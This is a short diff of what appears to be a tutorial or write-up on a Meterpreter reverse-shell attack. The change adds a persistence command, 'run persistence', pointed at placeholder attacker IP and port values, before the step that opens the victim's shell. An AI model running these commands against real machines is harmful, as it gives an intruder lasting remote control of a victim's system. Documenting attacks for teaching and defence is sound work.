@@ -107,8 +107,9 @@ Russell:
       
 
   Once the victim has executed the reverse shell, the attacker will see "Meterpreter session 1 opened." Lastly, the
-      attacker enters the following command to enter the shell of the victim:
-      
+      attacker enters the following command to ensure persistence and enter the shell of the victim:
+
+      $run persistence -p {attacker port} -r {attacker IP}
       $shell
 
 
